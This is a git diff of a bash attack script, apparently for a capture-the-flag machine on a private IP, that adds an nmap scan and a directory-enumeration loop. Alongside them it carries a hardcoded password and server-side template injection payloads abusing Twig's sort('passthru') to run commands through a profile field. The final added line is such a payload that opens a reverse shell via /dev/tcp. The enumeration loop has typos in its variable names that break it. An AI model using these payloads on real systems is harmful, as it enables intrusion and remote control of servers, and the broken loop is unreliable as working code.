@@ -1,9 +1,21 @@
 #!/usr/bin/env bash
 
-target='http://10.10.128.56'
+# Initial Scan
+ip='10.10.10.10'
+nmap -sV -sC $ip > nmap.txt
 
-# Response Information
-#curl -s -D - -o /dev/null "$target"
+## Scan 80
+
+# Discovery
+while IFS='' read name
+do
+    attemtp=$(curl -sL "target$name" -w %{http_code})
+    code=${attempt: -3}
+    if [[ "$code" == "200" ]]
+    then
+        echo "name" >> enumerated_files.txt
+    fi
+done < /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
 
 # Home Page
 #curl -sL "$target/index.php" -O
@@ -51,3 +63,5 @@ password='superSecurePasswd101'
 curl -sL "$target/update_profile.php" -d "fname={{['"'bash -c ls\", '']|sort('passthru')}}" -d "email=$username" --cookie admin.cookie
 curl -sL "$target/update_profile.php"  --cookie admin.cookie -O
 curl -sL "$target/dashboard.php"  --cookie admin.cookie
+
+{{["bash -c 'exec bash -i >& /dev/tcp/10.10.10.10/4200 0>&1'",'']|sort('passthru')}}
